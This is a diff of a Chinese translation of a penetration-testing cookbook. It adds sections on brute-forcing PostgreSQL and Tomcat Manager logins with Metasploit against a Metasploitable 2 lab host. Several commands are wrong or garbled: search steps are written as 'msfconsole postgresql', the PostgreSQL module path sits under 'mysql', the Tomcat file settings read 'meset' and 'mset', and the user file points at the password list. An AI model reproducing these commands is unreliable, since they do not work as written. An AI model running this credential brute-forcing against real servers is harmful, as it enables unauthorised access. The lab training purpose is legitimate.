@@ -395,7 +395,7 @@ MSFCLI 的一些命令是：
 3.  搜索可用的 MySQL 模块。
 
     ```
-    msfconsole 
+    msfconsole mysql
     ```
     
     ![](img/6-6-1.jpg)
@@ -451,3 +451,168 @@ MSFCLI 的一些命令是：
 ### 更多
 
 这个秘籍中，我们使用了自己生成的用户名和密码文件。有许多方法可以生成用户名和密码单词列表，这些方法在第八章中涉及。
+
+## 6.7 Metasploitable PostgreSQL
+
+这个秘籍中，我们会探索如何使用 Metasploit 来攻击 PostgreSQL 数据库服务器，使用 PostgreSQL 扫描器模块。PostgreSQL 被誉为全世界最先进的开源数据库，许多爱好者声称它是企业级的数据库。我们会使用 Metasploit 来爆破 PostgreSQL 登录。
+
+### 准备
+
+需要满足下列要求：
+
++   内部网络的连接。
+
++   运行在渗透环境中的 Metasploitable 。
+
++   用于执行字典攻击的单词列表。
+
+### 操作步骤
+
+让我们通过打开终端窗口来开始 PostgreSQL 攻击：
+
+1.  打开终端窗口。
+
+2.  启动 MSFCONSOLE。
+
+    ```
+    msfconsole 
+    ```
+    
+3.  搜索可用的 PostgreSQL 模块。
+
+    ```
+    msfconsole postgresql
+    ```
+    
+    ![](img/6-7-1.jpg)
+    
+4.  使用 PostgreSQL 扫描器模块。
+
+    ```
+    use auxiliary/scanner/mysql/postgres_login
+    ```
+    
+    ![](img/6-7-2.jpg)
+    
+5.  显示模块的可用选项。
+
+    ```
+    show options
+    ```
+        
+6.  将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。
+
+    ```
+    set RHOST 192.168.10.111 
+    ```
+    
+7.  设置用户名文件的位置。你可以选择：
+
+    ```
+    set user_file /root/Desktop/usernames.txt
+    ```
+    
+8.  设置密码文件的位置。你可以选择：
+
+    ```
+    set pass_file /root/Desktop/passwords.txt
+    ```
+    
+9.  执行漏洞利用：
+
+    ```
+    Exploit
+    ```
+        
+0.  Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的`+`符号就可以了。
+    
+### 工作原理
+
+这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用   Metasploitable 2 靶机上的 PostgreSQL 漏洞。我们以启动控制台并搜索所有已知的 PostgreSQL 模块来开始。在选择 PostgreSQL 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 PostgreSQL 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 PostgreSQL 数据库。之后找到生效的登录和密码组合旁边的`+`符号就可以了。
+
+### 更多
+
+这个秘籍中，我们使用了默认的 PostgreSQL  用户名和密码文件。然而我们也可以创建自己的文件。有许多方法可以生成用户名和密码单词列表，这些方法在第八章中涉及。
+
+## 6.8 Metasploitable Tomcat
+
+这个秘籍中，我们会探索如何使用 Metasploit 攻击 Tomcat 服务器，使用 Tomcat Manager Login 模块。Tomcat，或 Apache Tomcat，是开源的 Web 服务器，和 Servlet 容器，用于运行 Java Servt 和 JSP。Tomcat 服务器纯粹使用 Java 编写。我们会使用 Metasploit 来爆破 Tomcat 的登录。
+
+### 准备
+
+需要满足下列要求：
+
++   内部网络的连接。
+
++   运行在渗透环境中的 Metasploitable 。
+
++   用于执行字典攻击的单词列表。
+
+### 操作步骤
+
+让我们通过打开终端窗口来开始这个秘籍：
+
+1.  打开终端窗口。
+
+2.  启动 MSFCONSOLE。
+
+    ```
+    msfconsole 
+    ```
+    
+3.  搜索可用的 Tomcat 模块。
+
+    ```
+    msfconsole tomcat
+    ```
+    
+    ![](img/6-8-1.jpg)
+    
+4.  使用 Tomcat Application Manager Login Utility。
+
+    ```
+    use auxiliary/scanner/http/tomcat_mgr_login 
+    ```
+    
+5.  显示模块的可用选项。
+
+    ```
+    show options
+    ```
+    
+    > 要注意我们有很多设置为“是”的项目，它们都是必须的。我们使用它们的默认值。
+        
+6.  设置`Pass_File`：
+
+    ```
+    PASS_FILE meset /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
+    ```
+    
+7.  设置`Pass_File`：
+
+    ```
+    USER_FILE mset /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
+    ```
+
+8.  设置目标的`RHOST`，这里我们选择我们的 Metasploitable 2 主机：
+
+    ```
+    set RHOSTS 192.168.10.111
+    ```
+    
+9.  将`RPORT`设置为 8180：
+
+    ```
+    set RPORT 8180
+    ```
+    
+0.  执行漏洞利用：
+
+    ```
+    Exploit
+    ```
+    
+### 工作原理
+
+这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用   Metasploitable 2 靶机上的 Tomcat 漏洞。我们以启动控制台并搜索所有已知的 Tomcat 模块来开始。在选择 Tomcat 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 Tomcat 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 Tomcat 数据库。之后找到生效的登录和密码组合旁边的`+`符号就可以了。
+
